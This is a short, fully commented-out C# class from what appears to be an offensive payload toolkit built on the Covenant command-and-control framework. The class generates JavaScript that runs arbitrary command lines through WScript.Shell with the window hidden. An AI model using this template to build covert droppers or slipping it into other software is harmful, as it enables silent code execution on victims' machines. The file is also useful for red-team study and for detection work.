/*using System;
using System.Collections.Generic;
using System.Text;

using Covenant.Models.Launchers;

namespace MyWarez.Payloads
{    
    public class ExecCmdlineJavaScript : ExecCmdline
    {
        public ExecCmdlineJavaScript(ProcessList processList) : base(processList) { }
        public override bool IsCompatible(Tonsil.Files.FileType fileType) => fileType == Tonsil.Files.FileType.JavaScript;
        public override PayloadType Type { get; } = PayloadType.JavaScript;
        public override string Name { get; } = "ExecCmdlineJavaScript";
        public override string Description { get; } = "JavaScript that executes cmdlines";
        protected override string EscapeCmdline(string script) => script.Replace(@"\", @"\\").Replace(@"""", @"\""");
        protected override string TemplateExecCmdline { get; } = @"new ActiveXObject(""WScript.Shell"").Run(""{0}"", 0, true);" + "\n";
    }   
}*/